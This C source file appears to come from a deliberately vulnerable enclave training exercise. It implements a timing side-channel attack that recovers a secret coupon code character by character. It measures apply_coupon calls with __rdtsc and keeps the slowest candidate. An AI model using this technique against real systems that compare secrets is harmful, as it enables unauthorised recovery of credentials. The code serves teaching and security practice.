
#include "stdafx.h"
#include "exploits.h"
#include "common_enclave_actions.h"


void e1_timing_attack(char* server_ip, int iport, char* library_folder)
{
	// create an enclave

	// do apply coupon with time measurement for each byte until first 32 byte coupon is recovered
	// the rest of coupons left as an excersise to the practitioner

	if (!load_enclave())
	{
		printf("\n Can not create enclave for timing attack ...");
		return;
	}
	if (!init_enclave(server_ip, library_folder, iport))
	{
		printf("\n Can not initialize enclave for timing attack ...");
		return;
	}
	// 
	char *alphabet = "CDEFGHIJKLMNOPQRSTUVWXYZ0123456789_AB";
	// we already know that the coupons starting from DVSE_CPN from the previous excercise
	char coupon[33] = "DVSE_CPN_\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
	bool res = false;
	int syms_in_alphabet = (int)strlen(alphabet);
	int num_combinations = syms_in_alphabet * syms_in_alphabet;

	uint64_t time_diffs[40*40];// = (uint64_t*)malloc(sizeof(uint64_t)*syms_in_alphabet);
	int i, j, try_count = 1024*4;
	int wrptr = 8;
	do
	{
		memset(time_diffs, 0, sizeof(uint64_t)*40*40);
		for (i = 0; i < num_combinations; i++)
		{
			coupon[wrptr] = alphabet[i / syms_in_alphabet];
			coupon[wrptr+1] = alphabet[i % syms_in_alphabet];
			for (j = 0; j < try_count; j++)
			{
				uint64_t start, end;
				start = __rdtsc();
				res = apply_coupon(coupon);
				end = __rdtsc();
				if (res)
				{
					printf("\nRecovered coupon: %s", coupon);
					return;
				}
				/*if (j > try_count >> 1)*/ time_diffs[i] += (uint64_t)(end - start);
			}
		}
		uint64_t max_diff = 0;
		int recovered_index = 0;
		uint64_t cumulative_by_first_letter[256];
		memset(cumulative_by_first_letter, 0, sizeof(cumulative_by_first_letter));
		for (j = 0; j < num_combinations; j++)
		{
			cumulative_by_first_letter[j / syms_in_alphabet] += time_diffs[j];
			/*if (time_diffs[j] > max_diff)
			{
				max_diff = time_diffs[j];
				recovered_index = j;
			}*/

		}
		for (j = 0; j < syms_in_alphabet; j++)
		{
			if (cumulative_by_first_letter[j] > max_diff)
			{
				max_diff = cumulative_by_first_letter[j];
				recovered_index = j;
			}

		}
		coupon[wrptr] = alphabet[recovered_index];
		coupon[wrptr + 1] = '\0';
		wrptr += 1;
		//coupon[wrptr+1] = alphabet[recovered_index % syms_in_alphabet];
		//wrptr+=2;
		if (strncmp(coupon, "DVSE_CPN_", wrptr>=strlen("DVSE_CPN_")?strlen("DVSE_CPN_"):wrptr ))
		{
			printf("\n FAIL, %s", coupon);
			exit(1);
		}
	} while (!res && wrptr < 32);

	if (!res || wrptr >= 32)
	{

		printf("\n timing attack failure, try again ");
		exit(1);
	}

}
